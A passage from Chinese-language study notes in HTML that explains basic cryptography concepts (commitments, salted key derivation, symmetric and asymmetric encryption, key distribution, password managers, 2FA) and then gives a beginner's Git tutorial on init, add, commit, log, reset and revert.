<li>承诺机制：假设我希望承诺一个值，但之后再透露它—— 比如在没有一个可信的、双方可见的硬币的情况下在我的脑海中公平的“扔一次硬币”。 我可以选择一个值 <span class="arithmatex">\(r = random()\)</span>,并和你分享它的哈希值 <span class="arithmatex">\(h = sha256(r)\)</span>。 这时你可以开始猜硬币的正反：我们一致同意偶数 <span class="arithmatex">\(r\)</span> 代表正面，奇数 <span class="arithmatex">\(r\)</span> 代表反面。 你猜完了以后，我告诉你值 <span class="arithmatex">\(r\)</span> 的内容，得出胜负。同时你可以使用 <span class="arithmatex">\(sha256(r)\)</span> 来检查我分享的哈希值 <span class="arithmatex">\(h\)</span> 以确认我没有作弊。否则我总是可以随意更改<span class="arithmatex">\(r\)</span>的值，来达到作弊的目的。</li>
</ul>
<h2 id="note-cs-tms-security-and-cryptography-_3">密钥生成函数<a class="headerlink" href="#note-cs-tms-security-and-cryptography-_3" title="Permanent link">&para;</a></h2>
<p>密钥生成函数(Key Derivation Function)是一种将输入映射为密钥的函数.被应用于包括生成固定长度，可以使用在其它密码算法中的密钥等方面。为了对抗穷举法goon估计，密钥生成函数通常会比较慢</p>
<p>存贮密码时，不应该存储明文密码，而是存储其hash值。这样即使数据库泄露，也不会泄露用户的密码。但是攻击者们已经拥有了一个庞大的数据库来对应hash值和明文密码（彩虹表），而大多数用户在不同的网站上使用相同的密码，所以攻击者可以通过这个数据库来破解用户的密码。</p>
<p>为了对抗这个问题，可以使用<code>salt</code>。<code>salt</code>是一个随机的字符串，它被添加到密码中，然后再进行hash。这样即使用户使用相同的密码，由于<code>salt</code>不同，<code>hash</code>值也会不同。这样即使攻击者拥有了一个庞大的数据库，也无法通过hash值来破解密码。即<code>salt=random();KDF(password+salt)</code>。在验证登录请求时，使用输入的密码连接存储的盐重新计算哈希值 <code>KDF(input + salt)</code>，并与存储的哈希值对比。</p>
<h2 id="note-cs-tms-security-and-cryptography-_4">对称加密<a class="headerlink" href="#note-cs-tms-security-and-cryptography-_4" title="Permanent link">&para;</a></h2>
<p>对称加密是一种加密方式，加密和解密使用相同的密钥。对称加密的优点是速度快，缺点是密钥的分发和管理。</p>
<p>其基本过程如下：</p>
<ul>
<li>通过密钥生成函数生成密钥<span class="arithmatex">\(key\)</span></li>
<li>使用<span class="arithmatex">\(key\)</span>对明文(plaintext,p)进行加密，得到密文(ciphertext,c),即p=en(key,p)</li>
<li>使用<span class="arithmatex">\(key\)</span>对密文进行解密，得到明文，即p=de(key,c)</li>
</ul>
<p>很难在没有key的情况下破解密文，明文通过key加密再解密后必须和原明文一致（correctness）。</p>
<p>AES算法是目前常用的一种对称加密系统</p>
<h2 id="note-cs-tms-security-and-cryptography-_5">非对称加密<a class="headerlink" href="#note-cs-tms-security-and-cryptography-_5" title="Permanent link">&para;</a></h2>
<p>非对称加密的“非对称”代表在其环境中，使用两个具有不同功能的密钥： 一个是私钥(private key)，不向外公布；另一个是公钥(public key)，公布公钥不像公布对称加密的共享密钥那样可能影响加密体系的安全性。
非对称加密使用以下几个方法来实现加密/解密(encrypt/decrypt)，以及签名/验证(sign/verify)：</p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-tms-security-and-cryptography-__codelineno-2-1"></a><span class="n">keygen</span><span class="p">()</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">(</span><span class="k">public</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="k">private</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w">  </span><span class="p">(</span><span class="n">这是一个随机方法</span><span class="p">)</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-cs-tms-security-and-cryptography-__codelineno-2-2"></a>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-cs-tms-security-and-cryptography-__codelineno-2-3"></a><span class="n">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="o">:</span><span class="w"> </span><span class="n">array</span><span class="o">&lt;</span><span class="n">byte</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="k">public</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">array</span><span class="o">&lt;</span><span class="n">byte</span><span class="o">&gt;</span><span class="w">  </span><span class="p">(</span><span class="n">输出密文</span><span class="p">)</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-cs-tms-security-and-cryptography-__codelineno-2-4"></a><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="o">:</span><span class="w"> </span><span class="n">array</span><span class="o">&lt;</span><span class="n">byte</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="k">private</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">array</span><span class="o">&lt;</span><span class="n">byte</span><span class="o">&gt;</span><span class="w">  </span><span class="p">(</span><span class="n">输出明文</span><span class="p">)</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-cs-tms-security-and-cryptography-__codelineno-2-5"></a>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-cs-tms-security-and-cryptography-__codelineno-2-6"></a><span class="n">sign</span><span class="p">(</span><span class="n">message</span><span class="o">:</span><span class="w"> </span><span class="n">array</span><span class="o">&lt;</span><span class="n">byte</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="k">private</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">array</span><span class="o">&lt;</span><span class="n">byte</span><span class="o">&gt;</span><span class="w">  </span><span class="p">(</span><span class="n">生成签名</span><span class="p">)</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-cs-tms-security-and-cryptography-__codelineno-2-7"></a><span class="n">verify</span><span class="p">(</span><span class="n">message</span><span class="o">:</span><span class="w"> </span><span class="n">array</span><span class="o">&lt;</span><span class="n">byte</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">signature</span><span class="o">:</span><span class="w"> </span><span class="n">array</span><span class="o">&lt;</span><span class="n">byte</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="k">public</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="w">  </span><span class="p">(</span><span class="n">验证签名是否是由和这个公钥相关的私钥生成的</span><span class="p">)</span>
</span></code></pre></div>
<p>非对称的加密/解密方法和对称的加密/解密方法有类似的特征。
信息在非对称加密中使用 公钥 加密， 且输出的密文很难在不知道 私钥 的情况下得出明文。
解密方法 <code>decrypt()</code> 有明显的正确性。 给定密文及私钥，解密方法一定会输出明文： <code>decrypt(encrypt(m, public key), private key) = m</code>。</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>对称加密好比一道防盗门，只有一把钥匙，只要是有钥匙的人都可以进出，而非对称加密好比是一把锁和钥匙，任何得到这把锁的人都可以锁上，但只有持有钥匙的人才能打开。</p>
</div>
<h3 id="note-cs-tms-security-and-cryptography-_6">非对称加密的应用<a class="headerlink" href="#note-cs-tms-security-and-cryptography-_6" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">PGP</a> 电子邮件加密：用户可以将所使用的公钥在线发布，比如：PGP 密钥服务器或 <a href="https://keybase.io">Keybase</a>。任何人都可以向他们发送加密的电子邮件。</li>
<li>聊天加密：像 Signal 和 Keybase 使用非对称密钥来建立私密聊天。</li>
<li>软件签名：Git 支持用户对提交(commit)和标签(tag)进行 GPG 签名。任何人都可以使用软件开发者公布的签名公钥验证下载的已签名软件。</li>
</ul>
<h3 id="note-cs-tms-security-and-cryptography-_7">密钥分发<a class="headerlink" href="#note-cs-tms-security-and-cryptography-_7" title="Permanent link">&para;</a></h3>
<p>非对称加密面对的主要挑战是，如何分发公钥并对应现实世界中存在的人或组织。</p>
<p>Signal 的信任模型是，信任用户第一次使用时给出的身份(trust on first use)，同时支持用户线下(out-of-band)、面对面交换公钥（Signal 里的 safety number）。</p>
<p>PGP 使用的是 信任网络。简单来说，如果我想加入一个信任网络，则必须让已经在信任网络中的成员对我进行线下验证，比如对比证件。验证无误后，信任网络的成员使用私钥对我的公钥进行签名。这样我就成为了信任网络的一部分。只要我使用签名过的公钥所对应的私钥就可以证明“我是我”。</p>
<p>Keybase 主要使用 社交网络证明 (social proof)，和一些别的精巧设计。Keybase 会在你的社交网络中寻找你的朋友，看他们是否已经验证了他们的公钥。如果你的朋友已经验证了他们的公钥，那么你就可以信任他们的公钥。Keybase 也支持用户验证自己的公钥，比如通过在自己的网站上发布验证信息。</p>
<h3 id="note-cs-tms-security-and-cryptography-_8">密码管理器<a class="headerlink" href="#note-cs-tms-security-and-cryptography-_8" title="Permanent link">&para;</a></h3>
<p>密码管理器会帮助你对每个网站生成随机且复杂（表现为高熵）的密码，并使用你指定的主密码配合密钥生成函数来对称加密它们。</p>
<p>你只需要记住一个复杂的主密码，密码管理器就可以生成很多复杂度高且不会重复使用的密码。密码管理器通过这种方式降低密码被猜出的可能，并减少网站信息泄露后对其他网站密码的威胁。</p>
<p>例如，<a href="https://1password.com">1Password</a> 和 <a href="https://www.lastpass.com">LastPass</a> 是两个常用的密码管理器。</p>
<h3 id="note-cs-tms-security-and-cryptography-2fa">2FA<a class="headerlink" href="#note-cs-tms-security-and-cryptography-2fa" title="Permanent link">&para;</a></h3>
<p>2FA 是两步验证(two-factor authentication)的缩写。2FA 通常是指在输入密码之后，还需要提供第二个验证因素，比如手机上的一个应用程序生成的一次性密码，或者通过短信发送的一次性密码。来消除密码泄露或者钓鱼攻击（钓鱼攻击指的是一种通过伪装成可信来源（如银行、社交平台、企业等）来诱骗用户泄露敏感信息）的风险。</p></section><section class="print-page" id="note-cs-tms-miscellaneous" heading-number="2.4.2.9"><h1 id="note-cs-tms-miscellaneous-miscellaneous">Miscellaneous<a class="headerlink" href="#note-cs-tms-miscellaneous-miscellaneous" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div></section></section>
                    <section class='print-page md-section' id='section-2-4-3' heading-number='2.4.3'>
                        <h1>Git 版本控制<a class='headerlink' href='#section-2-4-3' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-cs-git" heading-number="2.4.3.1"><h1 id="note-cs-git-git">Git 笔记<a class="headerlink" href="#note-cs-git-git" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 4596 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 56 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 39 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 17 分钟</p>
</div>
<p>作为计科专业的学生,怎么能不会Git呢</p>
<p>git命令比较多,有些命令的意义比较长难以一直记住,在这里推荐一个非常好用的工具<a href="https://tldr.sh/">tldr</a>，Too long don't read~</p>
<h2 id="note-cs-git-_1">安装<a class="headerlink" href="#note-cs-git-_1" title="Permanent link">&para;</a></h2>
<p>Windows 用户可以通过<a href="https://git-scm.com/download/win">Git官网</a>下载安装包进行安装</p>
<p>Linux 用户可以通过以下命令进行安装</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-git-__codelineno-0-1"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>update
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-git-__codelineno-0-2"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>git
</span></code></pre></div>
<p>macOS 用户可以通过以下命令进行安装</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-git-__codelineno-1-1"></a>brew<span class="w"> </span>install<span class="w"> </span>git
</span></code></pre></div>
<h3 id="note-cs-git-_2">检验是否安装成功<a class="headerlink" href="#note-cs-git-_2" title="Permanent link">&para;</a></h3>
<p>在终端中输入以下命令,如果出现版本号,则说明安装成功</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-git-__codelineno-2-1"></a>git<span class="w"> </span>--version
</span></code></pre></div>
<div class="admonition info">
<p class="admonition-title">git 是怎么工作的</p>
<p>首先,有以下几个概念</p>
<ol>
<li>
<p><strong>工作区 (Working Directory)</strong>: 这是你在本地计算机上看到的文件和目录。你在这里进行文件的添加、修改和删除操作。</p>
</li>
<li>
<p><strong>暂存区 (Staging Area)</strong>: 当你对工作区中的文件进行修改后，可以使用 <code>git add</code> 命令将这些修改添加到暂存区。暂存区是一个临时区域,它是工作区和本地仓库的桥梁，起到缓冲的作用,用于记录即将提交的更改。</p>
</li>
<li>
<p><strong>本地仓库 (Local Repository)</strong>: 使用 <code>git commit</code> 命令将暂存区中的更改提交到本地仓库。提交后，这些更改将被记录在本地仓库的历史记录中。</p>
</li>
<li>
<p><strong>远程仓库 (Remote Repository)</strong>: 远程仓库是存储在服务器上的 Git 仓库。你可以使用 <code>git push</code> 命令将本地仓库中的更改推送到远程仓库，或者使用 <code>git pull</code> 命令从远程仓库拉取最新的更改。</p>
</li>
<li>
<p><strong>版本库 (Repository)</strong>: 版本库是 Git 用来保存项目历史记录的地方。它包含了所有提交的记录和项目的所有版本。在本地仓库中,版本库是.git文件夹,在远程仓库中,版本库是远程仓库里面的.git文件夹</p>
</li>
</ol>
<p><figure markdown="span">
<img alt="Image title" src="../NOTE/CS/GIT/img/git.png" width="400" />
<figcaption>示意图</figcaption>
</figure></p>
<p><figure markdown="span">
<img alt="Image title" src="../NOTE/CS/GIT/img/git1.png" width="400" />
<figcaption>版本库,工作区和暂存区</figcaption>
</figure></p>
</div>
<h2 id="note-cs-git-_3">本地操作<a class="headerlink" href="#note-cs-git-_3" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-git-_4">初始化<a class="headerlink" href="#note-cs-git-_4" title="Permanent link">&para;</a></h3>
<p>创建一个文件夹,然后进入文件夹,在终端中输入以下命令</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-git-__codelineno-3-1"></a>git<span class="w"> </span>init
</span></code></pre></div>
这条命令会在当前目录下创建一个.git文件夹,这个文件夹就是版本库</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/init.png" width="400" />

<figcaption>初始化</figcaption>
</figure>
<h3 id="note-cs-git-_5">添加文件<a class="headerlink" href="#note-cs-git-_5" title="Permanent link">&para;</a></h3>
<p>此时 <strong>工作区</strong> 中有一个text.txt文件,现在我们想把这个文件添加到 <strong>暂存区</strong> 中</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-git-__codelineno-4-1"></a>git<span class="w"> </span>add<span class="w"> </span>text.txt
</span></code></pre></div>
<p>此时 <strong>暂存区</strong> 中就多了一个text.txt文件，我们可以使用</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-git-__codelineno-5-1"></a>git<span class="w"> </span>status
</span></code></pre></div>
<p>来查看此时git的状态</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/add.png" width="400" />

<figcaption>添加文件</figcaption>
</figure>
<p>在这里,将文件加入暂存区后,文件就在暂存区中等待我们的提交(Commit)了</p>
<details class="note">
<summary>常见的 git add 的指令</summary>
<ol>
<li>
<p>添加单个文件：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-git-__codelineno-6-1"></a>git<span class="w"> </span>add<span class="w"> </span>&lt;filename&gt;
</span></code></pre></div>
例如，添加 <code>text.txt</code> 文件：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-git-__codelineno-7-1"></a>git<span class="w"> </span>add<span class="w"> </span>text.txt
</span></code></pre></div></p>
</li>
<li>
<p>添加多个文件：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-git-__codelineno-8-1"></a>git<span class="w"> </span>add<span class="w"> </span>&lt;file1&gt;<span class="w"> </span>&lt;file2&gt;<span class="w"> </span>&lt;file3&gt;
</span></code></pre></div>
例如，添加 <code>file1.txt</code>、<code>file2.txt</code> 和 <code>file3.txt</code>：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-cs-git-__codelineno-9-1"></a>git<span class="w"> </span>add<span class="w"> </span>file1.txt<span class="w"> </span>file2.txt<span class="w"> </span>file3.txt
</span></code></pre></div></p>
</li>
<li>
<p>添加当前目录下的所有文件：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-cs-git-__codelineno-10-1"></a>git<span class="w"> </span>add<span class="w"> </span>.
</span></code></pre></div>
这条命令会将当前目录下的所有更改添加到暂存区。</p>
</li>
<li>
<p>添加特定目录下的所有文件：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-cs-git-__codelineno-11-1"></a>git<span class="w"> </span>add<span class="w"> </span>&lt;directory&gt;/
</span></code></pre></div>
例如，添加 <code>src</code> 目录下的所有文件：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-cs-git-__codelineno-12-1"></a>git<span class="w"> </span>add<span class="w"> </span>src/
</span></code></pre></div></p>
</li>
<li>
<p>添加符合特定模式的文件：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#note-cs-git-__codelineno-13-1"></a>git<span class="w"> </span>add<span class="w"> </span>*.txt
</span></code></pre></div>
这条命令会将当前目录下所有 <code>.txt</code> 文件添加到暂存区。</p>
</li>
<li>
<p>交互式添加文件：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#note-cs-git-__codelineno-14-1"></a>git<span class="w"> </span>add<span class="w"> </span>-i
</span></code></pre></div>
这条命令会进入交互模式，允许你选择性地添加文件。</p>
</li>
<li>
<p>更新已追踪文件的更改：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#note-cs-git-__codelineno-15-1"></a>git<span class="w"> </span>add<span class="w"> </span>-u
</span></code></pre></div>
这条命令只会添加已追踪文件的更改，不会添加新文件。</p>
</li>
<li>
<p>添加所有更改，包括未追踪文件：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#note-cs-git-__codelineno-16-1"></a>git<span class="w"> </span>add<span class="w"> </span>-A
</span></code></pre></div>
这条命令会将所有更改（包括新文件和删除的文件）添加到暂存区。</p>
</li>
</ol>
<p>这些指令可以帮助你根据不同的需求灵活地将文件添加到 Git 的暂存区中。</p>
</details>
<h3 id="note-cs-git-_6">提交<a class="headerlink" href="#note-cs-git-_6" title="Permanent link">&para;</a></h3>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#note-cs-git-__codelineno-17-1"></a>git<span class="w"> </span>commit<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;提交信息&quot;</span>
</span></code></pre></div>
例如,在上面的例子中,我们可以运行</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#note-cs-git-__codelineno-18-1"></a>git<span class="w"> </span>commit<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;添加text.txt文件&quot;</span>
</span></code></pre></div>
来进行提交</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/commit.png" width="400" />

<figcaption>提交</figcaption>
</figure>
<p>查看信息</p>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#note-cs-git-__codelineno-19-1"></a>[master (root-commit) f81217a] 添加text.txt文件
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#note-cs-git-__codelineno-19-2"></a> 1 file changed, 1 insertion(+)
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#note-cs-git-__codelineno-19-3"></a> create mode 100644 text.txt
</span></code></pre></div>
这条信息表示我们在 master 分支上进行了一个根提交（root-commit），提交的哈希值是 f81217a。提交信息为“添加text.txt文件”。在这次提交中，有一个文件发生了变化，进行了1次插入操作，并且创建了一个新的文件 text.txt，文件权限为 100644。文件权限 100644 表示这是一个普通文件，所有者有读写权限，组用户和其他用户有只读权限。</p>
<p>我们可以通过
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#note-cs-git-__codelineno-20-1"></a>git<span class="w"> </span>log
</span></code></pre></div>
来查看提交信息</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/log.png" width="400" />

<figcaption>查看提交信息</figcaption>
</figure>
<p>这里展示了完整的提交信息,包括提交的哈希值,提交信息,提交时间,提交者等信息，如果不想要看到这么多信息,可以使用</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#note-cs-git-__codelineno-21-1"></a>git<span class="w"> </span>log<span class="w"> </span>--oneline
</span></code></pre></div>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/log1.png" width="400" />

<figcaption>查看提交信息</figcaption>
</figure>
<h3 id="note-cs-git-_7">版本回退<a class="headerlink" href="#note-cs-git-_7" title="Permanent link">&para;</a></h3>
<p>设想这样一个场景,你修改了十次文件,然后你发现你修改错了,现在你想要回到你修改前的状态,如果没有git,而你的编辑器又恰好不能一直<code>Ctrl+Z</code>到你修改前的状态,那么你只能手动一个一个的改回去,这显然是非常麻烦的,而git可以轻松的解决这个问题</p>
<p>Git使用git reset 命令来回退版本,git reset 命令有三个参数</p>
<ol>
<li>--soft: 回退到某个版本,但是不改变任何东西</li>
<li>--hard: 回退到某个版本,并丢弃工作区,和暂存区的所有修改内容</li>
<li>--mixed: 回退到某个版本,保留工作区的修改，丢弃暂存区的修改</li>
</ol>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/reset.png" width="400" />

<figcaption>绿色代表保存,红色代表丢弃</figcaption>
</figure>
<p>接下来我们具体看看它们是怎么工作的,首先我们创建两个文件,并进行两次提交</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/reset1.png" width="400" />

<figcaption>创建两个文件,并进行两次提交</figcaption>
</figure>
<p>此时Head指向的是第三次提交,也就是master分支的最新版本,此时工作区有三个文件,暂存区为空</p>
<div align="center">
<img src="../NOTE/CS/GIT/img/reset2.png" width="400">
</div>

<p>为了方便比对三种不同指令,将这个仓库复制两个副本,分别命名为git_practice1和git_practice2</p>
<h4 id="note-cs-git--soft">--soft<a class="headerlink" href="#note-cs-git--soft" title="Permanent link">&para;</a></h4>
<p>现在,我们修改text1.txt文件,并进行一次add</p>
<div align="center">
<img src="../NOTE/CS/GIT/img/reset3.png" width="400">
</div>

<p>现在，使用soft指令回退到第第一次提交</p>
<div align="center">
<img src="../NOTE/CS/GIT/img/reset4.png" width="400">
</div>

<p>可以看到,工作区没有发生任何变化,但是暂存区发生了变化,我们之前提交的text2和text3文件变成了new file;</p>
<div align="center">
<img src="../NOTE/CS/GIT/img/reset5.png" width="400">
</div>

<p>同时两次提交都不见了,HEAD指向了第一次提交</p>
<p><strong>soft指令保存所有的更改,仅仅在commmit种有变化,这在处理只想要回退到某个版本,但是不想要丢弃工作区,和暂存区的修改时非常有用</strong></p>
<h4 id="note-cs-git--hard">--hard<a class="headerlink" href="#note-cs-git--hard" title="Permanent link">&para;</a></h4>
<p>现在,我们进入git_practice1,并进行一次add</p>
<p>使用hard指令回退到第一次提交</p>
<div align="center">
<img src="../NOTE/CS/GIT/img/reset6.png" width="400">
</div>

<p>可以看到,工作区,暂存区,和提交都发生了变化,工作区,暂存区,和提交都变成了第一次提交的样子</p>
<p><strong>相当于第二次第三次提交以及它们的修改都没有发生过,执行类似于<code>Ctrl+Z</code>的操作</strong></p>
<h4 id="note-cs-git--mixed">--mixed<a class="headerlink" href="#note-cs-git--mixed" title="Permanent link">&para;</a></h4>
<p>现在,我们进入git_practice2,并进行一次add，然后使用mixed指令回退到第一次提交</p>
<div align="center">
<img src="../NOTE/CS/GIT/img/reset7.png" width="400">
</div>

<p>可以看到,暂存区空空如也,而工作区仍然是修改后的样子,<strong>相当于进行了修改,但是没有进行任何提交</strong></p>
<div class="admonition warning">
<p class="admonition-title">注意</p>
<p><code>--Hard</code>会丢弃所有的修改,一定要慎用,一般都推荐使用<code>--soft</code>和<code>--mixed</code></p>
<p>同时在上面我们也可以发现,使用soft的时候,不会给你任何提示,使用hard会告诉你现在head在哪里,使用mixed会告诉你unstaged changes,也就是未暂存的变化(在上面的例子中是M text.txt),即修改后(Modified)的text.txt文件从暂存区中移除</p>
<p>在实践过程中,可以使用<code>git ls-files</code>来查看暂存区中的文件</p>
<p>可以使用<code>git status</code>来查看工作区,暂存区,和提交的状态</p>
</div>
<h4 id="note-cs-git-revert">Revert<a class="headerlink" href="#note-cs-git-revert" title="Permanent link">&para;</a></h4>
<p>如果仅仅想要撤销某个提交,可以使用<code>git revert</code>命令,它会创建一个新的提交,撤销之前的提交</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#note-cs-git-__codelineno-22-1"></a>git<span class="w"> </span>revert<span class="w"> </span>-n<span class="w"> </span>&lt;commit_hash&gt;
</span></code></pre></div>
